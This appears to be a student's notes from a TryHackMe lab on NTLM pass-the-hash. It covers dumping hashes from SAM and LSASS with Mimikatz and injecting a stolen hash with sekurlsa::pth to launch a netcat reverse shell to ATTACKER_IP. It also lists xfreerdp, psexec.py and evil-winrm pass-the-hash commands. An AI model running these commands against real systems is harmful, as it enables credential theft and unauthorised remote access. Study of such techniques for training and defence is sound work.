# Alternate Authentication - NTLM

#### Alternate authentication material
- Any piece of data that can be used to access a Windows account without actually knowing a user's password itself  

## NTLM Authentication
### Pass-the-Hash
- Extract credentials from a host where we have attained admin privileges (using Mimikatz or similar tools)
- Retrieve clear-text passwords/hashes that can be easily cracked
- We may end up with non-crakced NTLM password hashes
- We can authenticate without requiring the clear-text password

Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash and authenticate.  

To extract NTLM hashes, we can either use Mimikatz to read the local SAM or extract hashes from LSASS memory.
1. Extract NTLM hashes from local SAM database
- Extract hashes from local users on machine
- No domain user hashes will be available

![Alt text](<../../Images/Pass-the-hash Mimikatz.png>)

2. Extract NTLM hashes from LSASS memory
- Extract any NTLM hashes for local users and any domain users that have logged on to the machine

![Alt text](<../../Images/Pass-the-hash Mimikatz 2.png>)

- Use extracted hashes to perform Pass-the-Hash attack by using Mimikatz to inject an access token for the victim on a reverse shell

`mimikatz # token::revert`  
`mimikatz # sekurlsa::pth /userLbob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555`

- Used `token::revert` to re-establish our original token privileges (trying to pass-the-hash with an elevated token will not work)
- This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user

AttackBox  
`nc -lvp 5555`

Running `whoami` will show the original user we were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.

### Pass-the-Hash using Linux

1) Connect to RDP using PtH  
`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`  

2) Connect via psexec using PtH  
`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`  

3) Connect to WinRM using PtH  
`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASHES`